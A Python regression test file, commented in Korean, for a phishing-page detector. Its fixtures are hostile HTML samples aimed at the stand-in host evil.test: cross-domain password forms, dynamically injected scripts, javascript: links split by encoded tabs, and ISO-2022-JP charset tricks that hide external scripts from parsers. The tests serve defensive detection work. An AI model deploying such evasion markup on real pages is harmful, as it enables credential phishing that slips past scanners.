"""보안 점검 5라운드(Codex R5-01~R5-12) 회귀 테스트. 각 시험은 해당 지적의 재현 조건을 그대로 쓴다."""
import time

import pytest

from app import explain as ex
from app import presentation as pres
from app import verdict as V
from app.urls import extract_urls, trimmed_urls

from .test_security_round3 import PAGE, _forms, _safe_ev
from .test_urls_kb_explain import kb
from .test_verdict import decide, page

from checklib import fetch_chain as fc  # noqa: E402
from checklib import inspect_page as ip  # noqa: E402
from checklib.parse_url import resolve_reference  # noqa: E402


def _not_safe(forms=None, **page_over):
    ev = _safe_ev(page={**page(), **({"forms": forms} if forms is not None else {}), **page_over})
    return decide(**ev).verdict != "safe"


def _verdict_of(html, ctype="", url=PAGE):
    r = ip.inspect_page(html if isinstance(html, bytes) else html.encode(), url, ctype)
    if not r.get("ok"):
        return "page-failed"
    return decide(**_safe_ev(page={**page(), **{k: r[k] for k in (
        "forms", "apk_links", "js_redirect_hint", "external_active_domains")}})).verdict


# ── R5-01: 값 안의 끝 부호는 문장 경계로 남는다 ────────────────────────────────────────────
def test_terminal_punctuation_inside_a_value_stays_a_sentence_boundary():
    from .test_security_round3 import _caution

    name = "비밀번호 입력을 권장합니다."
    template, payload_ = _caution(name)
    payload_["entity"] = name  # 이름 검증을 거치지 않은 값이 들어와도 검증기가 막아야 한다
    base = {"headline": "x", "recommended_action": "y"}
    assert ex.validate({**base, "detail": f"{name} 앱이나 대표 전화번호로 직접"}, payload_, kb, template) is None


def test_names_with_sentence_boundaries_are_rejected():
    assert pres.sanitize_name("비밀번호 입력을 권장합니다.") is None
    assert pres.sanitize_name("확인. 입력하세요") is None
    assert pres.sanitize_name("한빛 택배") == "한빛 택배"
    assert pres.sanitize_name("A.B Corp") == "A.B Corp"


# ── R5-02: 브라우저가 주소 안에 남기는 공백 ──────────────────────────────────────────────────
@pytest.mark.parametrize("text", ["https://hanbit.example/a bad", "https://hanbit.example/a\tbad",
                                  "https://hanbit.example/a　bad", "https://hanbit.example/a bad"])
def test_url_split_at_unusual_whitespace_is_marked_trimmed(text):
    assert extract_urls(text) == ["https://hanbit.example/a"] and "https://hanbit.example/a" in trimmed_urls(text)


def test_ordinary_separators_are_not_trimmed():
    assert trimmed_urls("보세요 https://hanbit.example/a 그리고\nhttps://hanbit.example/b\r\n") == set()


# ── R5-03: 상대 참조 해석 ─────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("ref,expect", [
    ("a//b", "https://hanbit.example/start/a//b"),
    ("?", "https://hanbit.example/start/x?"),
    ("?q=1", "https://hanbit.example/start/x?q=1"),
    ("#z", "https://hanbit.example/start/x?mode=benign#z"),
    ("", "https://hanbit.example/start/x?mode=benign"),
    ("/abs//p?x", "https://hanbit.example/abs//p?x"),
    ("../up", "https://hanbit.example/up"),
    ("c?d", "https://hanbit.example/start/c?d"),
])
def test_relative_references_resolve_like_whatwg(ref, expect):
    assert resolve_reference("https://hanbit.example/start/x?mode=benign#f", ref) == expect


def test_location_with_empty_segments_is_followed_as_the_browser_does():
    class F:
        def __init__(self):
            self.urls, self.r = [], [fc.Response(302, "a//b"), fc.Response(200, None, b"<html></html>")]

        def get(self, url):
            self.urls.append(url)
            return self.r.pop(0)

    f = F()
    fc.fetch_chain("https://hanbit.example/start?mode=benign", f)
    assert f.urls[1] == "https://hanbit.example/a//b"


# ── R5-04: 글자로 읽히는 요소는 토크나이저 차원에서 글자다 ────────────────────────────────────────
def test_script_and_base_tags_inside_text_elements_do_not_change_document_state():
    html = "<textarea><script></textarea><form action=https://evil.test><input type=password></form>"
    assert _verdict_of(html) != "safe"
    r = _forms("<textarea><base href=https://hanbit.example/></textarea><base href=https://evil.test/>"
               "<form action=/collect><input type=password></form>")
    assert r["forms"][0]["cross_domain"] is True
    r = _forms("<template><base href=https://hanbit.example/></template><base href=https://evil.test/>"
               "<form action=/collect><input type=password></form>")
    assert r["forms"][0]["cross_domain"] is True


def _no_hidden_form(r):
    return not any(f["cross_domain"] or "password" in f["field_types"] for f in r["forms"])


@pytest.mark.parametrize("opener", ["textarea", "title", "xmp", "noembed", "noframes", "iframe", "noscript"])
def test_text_elements_hide_inner_tags_from_the_parser(opener):
    r = _forms(f"<{opener}><form action=https://evil.test><input type=password></form></{opener}>")
    assert _no_hidden_form(r)  # 브라우저에서는 글자이므로 폼이 없다(textarea 자체는 입력란이다)
    r = _forms(f'<{opener}/><form action="https://evil.test"><input type=password></form></{opener}>')
    assert _no_hidden_form(r)  # 자기 닫음 표기는 무시되고 요소가 열린다


# ── R5-05: 폼 소유 ──────────────────────────────────────────────────────────────────────────────
def test_self_closing_form_tag_is_an_opening_tag():
    html = '<form id="f" /><input type=password><button formaction=https://evil.test>Go</button></form>'
    assert _verdict_of(html) != "safe"
    r = _forms(html)
    assert r["forms"][0]["cross_domain"] is True and "password" in r["forms"][0]["field_types"]


def test_form_inside_select_is_ignored_like_a_browser():
    html = "<select><form></select><form action=https://evil.test><input type=password></form>"
    assert _verdict_of(html) != "safe"


def test_self_closing_script_still_starts_raw_text():
    r = _forms('<script src="/ok" /><form action="/ok"></script><form action="https://evil.test">'
               "<input type=password></form>")
    assert any(f["cross_domain"] for f in r["forms"])


# ── R5-06: 요소에 따라 다른 속성이 쓰인다 ──────────────────────────────────────────────────────────
def test_every_effective_resource_attribute_is_inspected():
    assert _forms("<object src=/ok data=https://evil.test></object>")["external_active_domains"] == ["evil.test"]
    assert _forms("<svg><script src=/ok href=https://evil.test/a.js /></svg>")["external_active_domains"] == ["evil.test"]
    assert _forms('<embed src="/ok" href="https://evil.test/x">')["external_active_domains"] == ["evil.test"]


# ── R5-07: MIME 매개변수 ────────────────────────────────────────────────────────────────────────────
def test_mime_parameters_follow_quoted_string_rules():
    assert ip._content_type_charset('text/html; x=";charset=iso-2022-jp"; charset=utf-8') == "utf-8"
    assert ip._content_type_charset("text/html; charset='utf-8'") == "'utf-8'"  # 홑따옴표는 따옴표가 아니다
    assert ip._content_type_charset('text/html; charset="utf-8"; charset=euc-kr') == "utf-8"  # 첫 값
    assert ip._content_type_charset('text/html; charset="a\\"b"') == 'a"b'
    body = b'<p>ok</p>\x1b$B<script src="https://evil.test/a.js"></script>\x1b(B'
    r = _forms(body, ctype='text/html; x=";charset=iso-2022-jp"; charset=utf-8')
    assert r["external_active_domains"] == ["evil.test"]


# ── R5-08: 인코딩 사전 검사 ──────────────────────────────────────────────────────────────────────────
SHIFTED = b'\x1b$B<!--\x1b(B<script src="https://evil.test/a.js"></script>-->'


def test_commented_meta_declarations_are_ignored():
    # 주석 속 선언은 무시되므로 UTF-8로 읽혀 `<!--`가 주석을 연다(브라우저도 같다). 선언이 적용됐다면 스크립트가 드러난다.
    body = b"<!--<meta charset=iso-2022-jp>--><p>ok</p>" + SHIFTED
    assert _forms(body)["external_active_domains"] == []
    assert _forms(b"<meta charset=iso-2022-jp><p>ok</p>" + SHIFTED)["external_active_domains"] == ["evil.test"]


def test_unknown_meta_label_does_not_stop_the_scan():
    body = b"<meta charset=bogus><meta charset=iso-2022-jp><p>ok</p>" + SHIFTED
    r = _forms(body)
    assert r["ok"] and r["external_active_domains"] == ["evil.test"]  # 모르는 이름은 건너뛰고 두 번째 선언이 적용된다
    assert ip._prescan(b"<meta charset=bogus><meta charset=euc-kr>") == "euc-kr"
    assert ip._prescan(b"<!-- <meta charset=euc-kr> --><meta charset=utf-8>") == "utf-8"
    assert ip._prescan(b'<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">') == "euc-kr"
    assert ip._prescan(b"<meta xcharset=euc-kr>") is None
    assert ip._prescan(b"<p a='<meta charset=euc-kr>'>x") is None


# ── R5-09: ISO-2022-JP는 WHATWG 상태 기계를 따른다 ────────────────────────────────────────────────────
def test_iso_2022_jp_katakana_state_exposes_markup_like_a_browser():
    body = b'\x1b(I<!--\x1b(B<script src="https://evil.test/a.js"></script>-->'
    r = _forms(body, ctype="text/html; charset=iso-2022-jp")
    assert r["external_active_domains"] == ["evil.test"]
    assert ip._decode_iso2022jp(b"a\x1b$B$\"\x1b(Bb") == "aあb"  # JIS X 0208 두 바이트 글자


# ── R5-10: Content-Type은 잘라서 넘기지 않는다 ────────────────────────────────────────────────────────
def test_full_content_type_reaches_page_decoding():
    ctype = "text/html; pad=" + "a" * 90 + "; charset=iso-2022-jp"

    class One:
        def get(self, url):
            return fc.Response(200, None, SHIFTED)

    class Typed(fc.Response):
        content_type = ctype

    class F:
        def get(self, url):
            r = fc.Response(200, None, SHIFTED)
            r.content_type = ctype
            return r

    result, html = fc.fetch_chain(PAGE, F())
    assert len(result["final_content_type"]) == 100 and result["final_content_type_full"] == ctype
    r = ip.inspect_page(html, PAGE, result["final_content_type_full"])
    assert r["ok"] and r["external_active_domains"] == ["evil.test"]  # 전체 헤더로 해석하면 ISO-2022-JP라 스크립트가 드러난다
    cut = ip.inspect_page(html, PAGE, result["final_content_type"])  # 100자로 자른 헤더로는 charset을 놓친다
    assert cut["external_active_domains"] == []


def test_absurdly_long_content_type_is_a_fetch_error():
    httpx = pytest.importorskip("httpx")

    def handler(request):
        return httpx.Response(200, headers={"content-type": "text/html; pad=" + "a" * 5000},
                              stream=httpx.ByteStream(b"<html></html>"))

    f = fc.HttpxFetcher()
    f._client = httpx.Client(transport=httpx.MockTransport(handler), follow_redirects=False)
    with pytest.raises(fc.FetchError):
        f.get(PAGE)


# ── R5-11: 간접 활성화·동적 DOM 구성·탭이 든 javascript: ─────────────────────────────────────────────────
@pytest.mark.parametrize("html", [
    "<a id=go href=https://evil.test>Go</a><script>go.click.call(go)</script>",
    '<script>const s=document.createElement("script");s.src="https://evil.test/a.js";document.head.appendChild(s)</script>',
    '<a href="java&#9;script:window.open(\'https://evil.test\')">Go</a>',
    '<a href="java&#10;script:alert(1)">Go</a>',
    "<script>document.body.innerHTML = '<meta http-equiv=refresh content=\"0;url=https://evil.test\">'</script>",
    '<script>a.setAttribute("href","https://evil.test")</script>',
])
def test_indirect_activation_and_dynamic_construction_are_detected(html):
    assert _forms(html)["js_redirect_hint"] is True
    assert _verdict_of(html) != "safe"


# ── R5-12: 라벨 분류는 길이에 비례하지 않는다 ─────────────────────────────────────────────────────────────
def test_label_classification_time_is_bounded():
    html = "<label for=x>" + "z" * 500_000 + "</label>" + "<input id=x>" * 40_000
    t0 = time.time()
    r = _forms(html)
    assert time.time() - t0 < 8 and r["ok"]
    html = "<input name=" + "q" * 900_000 + ">" * 1
    t0 = time.time()
    _forms(html)
    assert time.time() - t0 < 4
